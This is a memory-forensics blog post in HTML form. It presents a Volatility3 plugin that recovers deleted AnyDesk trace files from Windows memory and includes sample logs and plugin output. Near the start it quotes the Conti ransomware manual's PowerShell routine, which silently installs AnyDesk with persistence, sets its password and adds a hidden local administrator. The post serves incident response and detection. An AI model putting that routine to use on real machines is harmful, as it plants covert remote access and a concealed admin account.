@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>
+  📦 Volatility3 Windows Plugin : Anydesk · ForensicXlab
+</title>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdn.jsdelivr.net/; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
+
+
+
+
+<meta name="author" content="ForensicXlab">
+<meta name="description" content="Abstract Link to heading When performing incident response, the adversary often use legitimate remote access software as an interactive command and control channel. Anydesk is one of those software. It as been used a lot in the wild in the past years by known threat actors. As an example, it was mentioned in the last year leaked Conti&rsquo;s manual. We can witness how was the tool installed by the attacker using powershell.">
+<meta name="keywords" content="blog, DFIR">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="📦 Volatility3 Windows Plugin : Anydesk"/>
+<meta name="twitter:description" content="Abstract Link to heading When performing incident response, the adversary often use legitimate remote access software as an interactive command and control channel. Anydesk is one of those software. It as been used a lot in the wild in the past years by known threat actors. As an example, it was mentioned in the last year leaked Conti&rsquo;s manual. We can witness how was the tool installed by the attacker using powershell."/>
+
+<meta property="og:title" content="📦 Volatility3 Windows Plugin : Anydesk" />
+<meta property="og:description" content="Abstract Link to heading When performing incident response, the adversary often use legitimate remote access software as an interactive command and control channel. Anydesk is one of those software. It as been used a lot in the wild in the past years by known threat actors. As an example, it was mentioned in the last year leaked Conti&rsquo;s manual. We can witness how was the tool installed by the attacker using powershell." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://www.forensicxlab.com/posts/anydesk/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-30T16:06:00+02:00" />
+<meta property="article:modified_time" content="2022-09-30T16:06:00+02:00" />
+
+
+
+
+
+<link rel="canonical" href="http://www.forensicxlab.com/posts/anydesk/">
+
+
+<link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4897cb1d7ba929d10aabbac6e9bf40a8ecb89318118d99027cb159e38fb32b28.css" integrity="sha256-SJfLHXupKdEKq7rG6b9AqOy4kxgRjZkCfLFZ44&#43;zKyg=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+<meta name="generator" content="Hugo 0.101.0" />
+
+
+
+
+
+  </head>
+
+
+
+
+<body class="preload-transitions colorscheme-light">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      ForensicXlab
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/toolshed/">ToolShed</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/contact/">Contact</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.forensicxlab.com/posts/anydesk/">
+              📦 Volatility3 Windows Plugin : Anydesk
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-09-30T16:06:00&#43;02:00">
+                September 30, 2022
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              8-minute read
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/memory-forensics/">Memory Forensics</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/dfir/">DFIR</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/memory-forensics/">Memory Forensics</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/anydesk/">Anydesk</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/windows/">Windows</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="abstract">
+  Abstract
+  <a class="heading-link" href="#abstract">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>When performing incident response, the adversary often use legitimate remote access software as an interactive command and control channel.
+Anydesk is one of those software. It as been used a lot in the wild in the past years by known threat actors.
+As an example, it was mentioned in the last year leaked Conti&rsquo;s manual. We can witness how was the tool installed by the attacker using powershell.</p>
+<p><em><strong>Conti AnyDesk installation tutorial</strong></em></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Закреп AnyDesk  - ознакомиться всем
+</span></span><span style="display:flex;"><span> Function AnyDesk {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    mkdir &#34;C:\ProgramData\AnyDesk&#34;
+</span></span><span style="display:flex;"><span>    # Download AnyDesk
+</span></span><span style="display:flex;"><span>    $clnt = new-object System.Net.WebClient
+</span></span><span style="display:flex;"><span>    $url = &#34;http://download.anydesk.com/AnyDesk.exe&#34;
+</span></span><span style="display:flex;"><span>    $file = &#34;C:\ProgramData\AnyDesk.exe&#34;
+</span></span><span style="display:flex;"><span>    $clnt.DownloadFile($url,$file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    net user oldadministrator &#34;qc69t4B#Z0kE3&#34; /add
+</span></span><span style="display:flex;"><span>    net localgroup Administrators oldadministrator /ADD
+</span></span><span style="display:flex;"><span>    reg add &#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist&#34; /v oldadministrator /t REG_DWORD /d 0 /f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    AnyDesk
+</span></span></code></pre></div><p>In this blog post, we will discover what are the useful files linked to anydesk and how valuable they can be for an investigation.
+Finally, in case the adversary is deleting those files using an anti-forensics technique, a volatility3 plugin will be proposed to to retrieve those information that might still reside in memory.</p>
+<h1 id="anydesk-trace-files">
+  Anydesk trace files
+  <a class="heading-link" href="#anydesk-trace-files">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>When using anydesk, specific files are written to trace the activity of the application. There is two interesting files :</p>
+<ul>
+<li>ad.trace</li>
+<li>ad_svc.trace</li>
+</ul>
+<p>On a windows 10 machine, you can respectively find those files in the <code>%APPDATA%\AnyDesk\</code> and <code>%SYSTEMROOT%\ProgramData\AnyDesk\</code>.
+Here is an example of data you could fin inside :</p>
+<p><em><strong>ad.trace content example</strong></em></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>info 2022-09-27 15:31:53.920       back   3240   5476                   app.backend_session - Starting session (deskrt, clipboard, chat, audio, input, tcp_tunnel).
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.920       back   3240   5476                       desk_rt.encoder - 2 segments.
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.923       back   3240   5476                     base.monitor_info - Monitors found: 1
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.923       back   3240   5476                   app.backend_session - Suspending session start until further notice.
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.925       back   3240   5476                   app.backend_session - Continueing session start.
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.925       back   3240   5476             desk_rt.capture_component - Starting capture.
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.925       back   3240   3892            capture.dda_stream_capture - Initializing D3D.
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.926       ctrl   6572   1320                        ad_app.control - Session count: (1, 1)
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.927       ctrl   6572   1320                       clipbrd.capture - Registered for clipboard notifications.
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.927       ctrl   6572   1320                    app.ctrl_clip_comp - Ready.
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.927       ctrl   6572   1320                     win_app.wallpaper - Starting wallpaper.
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.948       back   3240   5476             desk_rt.capture_component - Sending screen privacy status: off (no change).
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.948       back   3240   5476                        app.mouse_sink - Starting mouse sink.
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.950       back   3240   4136             desk_rt.capture_component - Keyboard layout changed to: unknown
+</span></span><span style="display:flex;"><span>info 2022-09-27 15:31:53.950       back   3240   4136             desk_rt.capture_component - Focused monitor changed: 0 (\\.\DISPLAY1)
+</span></span></code></pre></div><p><em><strong>ad_svc.trace content example</strong></em></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>info 2022-09-27 15:30:44.538       gsvc   9068   5920    1                      app.service - New IPC connection.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:44.538       gsvc   9068   5920    1                  fiber.scheduler - Spawning child fiber 13 (parent 1).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Creating an IPC accept socket.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Connected to 6572 (control:1).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Process login detected.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Using existing control (6572).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                  fiber.scheduler - Spawning child fiber 14 (parent 13).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:48.601       gsvc   9068   5920    1                      app.service - Process start: 3524 (frontend).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:48.601       gsvc   9068   5920    1           anynet.relay_connector - Short timeouts enabled.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:48.742       gsvc   9068   5920    1                      app.service - New IPC connection.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:48.742       gsvc   9068   5920    1                  fiber.scheduler - Spawning child fiber 15 (parent 1).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:48.742       gsvc   9068   5920   15                      app.service - Creating an IPC accept socket.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:48.742       gsvc   9068   5920   15                      app.service - Connected to 3524 (frontend).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:49.139       gsvc   9068   5920   15                      app.service - Process login detected.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:49.139       gsvc   9068   5920   15                  fiber.scheduler - Spawning child fiber 16 (parent 15).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:50.477       gsvc   9068   5920   15                            gcpsa - Downloading gcapi.dll.
+</span></span><span style="display:flex;"><span> error 2022-09-27 15:30:50.518       gsvc   9068   5920   15                 win_app.dir_file - Could not open file (2).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:50.518       gsvc   9068   5920   15                  fiber.scheduler - Spawning child fiber 17 (parent 15).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:50.918       gsvc   9068   5920                       fiber.scheduler - Fiber 17 terminated.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:51.175       gsvc   9068   5920   13                  fiber.scheduler - Spawning child fiber 18 (parent 13).
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:51.586       gsvc   9068   5920   15           anynet.main_relay_conn - Reporting system information.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:30:52.221       gsvc   9068   5920                       fiber.scheduler - Fiber 18 terminated.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:31:31.131       gsvc   9068   5920    4                  fiber.scheduler - Spawning root fiber 19.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:31:31.131       gsvc   9068   5920   19            anynet.connection_mgr - [192.168.164.130:49152] Incoming connection.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:31:31.147       gsvc   9068   5920   19                  fiber.scheduler - Spawning root fiber 20.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:31:31.272       gsvc   9068   5920   19                  fiber.scheduler - Spawning root fiber 21.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:31:31.287       gsvc   9068   5920   19                        handshake - Using protocol version 1.
+</span></span><span style="display:flex;"><span>  info 2022-09-27 15:31:31.287       gsvc   9068   5920   19            anynet.connection_mgr - [192.168.164.130:49152] Direct connection.
+</span></span></code></pre></div><p>We can se that we can extract useful artifacts, here is a non-exhaustive list :</p>
+<ul>
+<li>Anydesk version</li>
+<li>The IP address of the Anydesk relay used when initiating a connection</li>
+<li>Timestamps of each actions</li>
+<li>Listening port</li>
+<li>Incoming connection IP address</li>
+<li>Involved PIDs</li>
+<li>Number of monitors found</li>
+<li>Install date</li>
+</ul>
+<h1 id="the-anti-forensics-scenario">
+  The anti-forensics scenario
+  <a class="heading-link" href="#the-anti-forensics-scenario">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>If the adversary is aware of those artifacts, he might delete those files. However there is still a chance to retreive those cached files in memory!
+In this example, our is setup is 2 windows 10 virtual machine (<strong>A</strong> and <strong>B</strong>). <strong>A</strong> (attacker) is initiating a remote anydesk connection to <strong>B</strong> (victim).
+After a while the session is disconnected and A deleted the ad.trace and ad_scv.trace files.
+Next, a memory dump of machine <strong>B</strong> is performed, ready to be analyzed.</p>
+<p><img src="/images/anydesk/scenario.png" alt="alt text" title="Investigation scenario"></p>
+<h2 id="writing-a-volatility3-plugin">
+  Writing a Volatility3 plugin
+  <a class="heading-link" href="#writing-a-volatility3-plugin">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Using volatility3 we can write a plugin which will perform the following steps :</p>
+<ul>
+<li>Look for ad.trace and ad_scv.trace using the filescan plugin.</li>
+<li>Try to dump the files if found.</li>
+<li>Parse the files and render the data to the investigator.</li>
+</ul>
+<p>Indeed, we could just dump the file and analyse it offline. However, writing a dedicated plugin is useful to :</p>
+<ul>
+<li>Interface with the Timeliner plugin and make timestamps correlation with other artifacts.</li>
+<li>Interface with any other tools that are exploiting the other volatility3 output capabilities (json, csv, &hellip;).</li>
+</ul>
+<p><em><strong>Plugin output example</strong></em></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>~/work/DFIR/Memory Analysis/MemoryImages/Windows10_AnyDesk » vol -f Windows_AD.vmem anydesk
+</span></span><span style="display:flex;"><span>Volatility 3 Framework 2.0.1
+</span></span><span style="display:flex;"><span>Progress:  100.00		PDB scanning finished
+</span></span><span style="display:flex;"><span>Source	Type	Time	Context	Message
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>\ProgramData\AnyDesk\ad_svc.trace	info	2022-09-30 19:14:32.854000 	gsvc	Main relay connection established.
+</span></span><span style="display:flex;"><span>\ProgramData\AnyDesk\ad_svc.trace	info	2022-09-30 19:14:32.854000 	gsvc	New user data. Client-ID: 684537884.
+</span></span><span style="display:flex;"><span>\ProgramData\AnyDesk\ad_svc.trace	error	2022-09-30 19:14:32.954000 	gsvc	packet-type(60)
+</span></span><span style="display:flex;"><span>\ProgramData\AnyDesk\ad_svc.trace	info	2022-09-30 19:37:36.766000 	gsvc	Spawning root fiber 37.
+</span></span><span style="display:flex;"><span>\ProgramData\AnyDesk\ad_svc.trace	info	2022-09-30 19:37:36.766000 	gsvc	[192.168.164.130:52257] Incoming connection.
+</span></span><span style="display:flex;"><span>\ProgramData\AnyDesk\ad_svc.trace	info	2022-09-30 19:37:36.766000 	gsvc	Spawning root fiber 38.
+</span></span><span style="display:flex;"><span>\ProgramData\AnyDesk\ad_svc.trace	info	2022-09-30 19:37:36.867000 	gsvc	Spawning root fiber 39.
+</span></span><span style="display:flex;"><span>\ProgramData\AnyDesk\ad_svc.trace	info	2022-09-30 19:37:36.867000 	gsvc	Using protocol version 1.
+</span></span><span style="display:flex;"><span>\ProgramData\AnyDesk\ad_svc.trace	info	2022-09-30 19:37:36.867000 	gsvc	[192.168.164.130:52257] Direct connection.
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>\ProgramData\AnyDesk\ad_svc.trace	info	2022-09-30 19:37:36.926000 	gsvc	Backend PID: 1268
+</span></span><span style="display:flex;"><span>[...]
+</span></span></code></pre></div><p><em><strong>Using the timeliner plugin</strong></em></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info Fiber 20 terminated.  	2022-09-27 15:30:21.968000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info Fiber 20 terminated.  	2022-09-27 15:30:21.968000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info Starting installation of AnyDesk.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info Opening UAC dialog.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info line: &#34;C:\Users\Volatility\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\AnyDesk (1).exe&#34; --install &#34;C:\Program Files (x86)\AnyDesk&#34;  --start-with-win --create-shortcuts --create-taskbar-icon --create-desktop-icon --install-driver:mirror --install-driver:printer --update-disabled --svc-conf &#34;C:\Users\Volatility\AppData\Roaming\AnyDesk\service.conf&#34;  --sys-conf &#34;C:\Users\Volatility\AppData\Roaming\AnyDesk\system.conf&#34;  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info Starting installation of AnyDesk.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info Opening UAC dialog.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info line: &#34;C:\Users\Volatility\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\AnyDesk (1).exe&#34; --install &#34;C:\Program Files (x86)\AnyDesk&#34;  --start-with-win --create-shortcuts --create-taskbar-icon --create-desktop-icon --install-driver:mirror --install-driver:printer --update-disabled --svc-conf &#34;C:\Users\Volatility\AppData\Roaming\AnyDesk\service.conf&#34;  --sys-conf &#34;C:\Users\Volatility\AppData\Roaming\AnyDesk\system.conf&#34;  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>SymlinkScan	Symlink: Global -&gt; \BaseNamedObjects	2022-09-27 15:30:37.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>DllList	DLL Load: Process 380 svchost.exe Loaded rsaenh.dll (C:\Windows\system32\rsaenh.dll) Size 208896 Offset 140735643516928	2022-09-27 15:30:40.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>DllList	DLL Load: Process 380 svchost.exe Loaded CRYPTBASE.dll (C:\Windows\System32\CRYPTBASE.dll) Size 49152 Offset 140735649873920	2022-09-27 15:30:40.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>DllList	DLL Load: Process 3680 explorer.exe Loaded LINKINFO.dll (C:\Windows\SYSTEM32\LINKINFO.dll) Size 53248 Offset 140735555567616	2022-09-27 15:30:41.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>PsList	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>PsList	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>PsScan	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>PsScan	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>DllList	DLL Load: Process 380 svchost.exe Loaded SHELL32.dll (C:\Windows\System32\SHELL32.dll) Size 21954560 Offset 140735700271104	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>DllList	DLL Load: Process 3680 explorer.exe Loaded EhStorShell.dll (C:\Windows\System32\EhStorShell.dll) Size 225280 Offset 140735394414592	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>DllList	DLL Load: Process 9068 AnyDesk.exe Loaded AnyDesk.exe (C:\Program Files (x86)\AnyDesk\AnyDesk.exe) Size 16338944 Offset 19005440	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>DllList	DLL Load: Process 9068 AnyDesk.exe Loaded &lt;volatility3.framework.renderers.UnreadableValue object at 0x1464d7520&gt; (&lt;volatility3.framework.renderers.UnreadableValue object at 0x1464d7520&gt;) Size 2019328 Offset 140735723339776	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>DllList	DLL Load: Process 9068 AnyDesk.exe Loaded wow64.dll (C:\Windows\System32\wow64.dll) Size 339968 Offset 140735698370560	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>DllList	DLL Load: Process 9068 AnyDesk.exe Loaded wow64win.dll (C:\Windows\System32\wow64win.dll) Size 507904 Offset 140735699550208	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>DllList	DLL Load: Process 9068 AnyDesk.exe Loaded wow64cpu.dll (C:\Windows\System32\wow64cpu.dll) Size 36864 Offset 2002452480	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>NetScan	Network connection: Process 9068 AnyDesk.exe Local Address 0.0.0.0:7070 Remote Address 0.0.0.0:0 State LISTENING Protocol TCPv4 	2022-09-27 15:30:42.000000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info * AnyDesk Windows Startup *  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info * Version 7.0.14 (release/win_7.0.x 5cf8483107cd52198359a9504e0641fbe8cc59b3)  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info * Custom Client (no ID)  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A
+</span></span><span style="display:flex;"><span>Anydesk	AnyDesk: info * Checksum 1b8e6bc34e8cd533b5d7281935ff2761  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A
+</span></span></code></pre></div><h1 id="conclusion">
+  Conclusion
+  <a class="heading-link" href="#conclusion">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>This plugin was tested on Windows 10 memory dumps and the code can be found here : <a href="https://github.com/forensicxlab/volatility3_plugins">https://github.com/forensicxlab/volatility3_plugins</a>.
+I would like to thank @DebugPrivilege for the tweet he made about the subject that gave me the idea to write this plugin.
+It will be submitted to the volatility3 foundation for integration to the framework. You should Identify each steps described before in the source code comments.
+Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com">felix.guyard@forensicxlab.com</a>, or to make a pull-request on the repository to enhance this plugin or this article.</p>
+<p>Happy Hunting!</p>
+<h1 id="references">
+  References
+  <a class="heading-link" href="#references">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><a href="https://volatility3.readthedocs.io/en/latest/index.html">https://volatility3.readthedocs.io/en/latest/index.html</a>
+<a href="https://support.anydesk.com/knowledge/trace-files">https://support.anydesk.com/knowledge/trace-files</a>
+<a href="https://twitter.com/debugprivilege/status/1574435608713658368?s=21&amp;t=PWI9kJEpzECxhbyNFR8YUQ">https://twitter.com/debugprivilege/status/1574435608713658368?s=21&amp;t=PWI9kJEpzECxhbyNFR8YUQ</a></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2021 -
+    
+    2022
+     ForensicXlab 
+    ·
+    
+    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js" integrity="sha256-I2BJOV3DaC&#43;ycZZAhylY4S8fJAZ7sJwyeyM&#43;YpDH7aw="></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
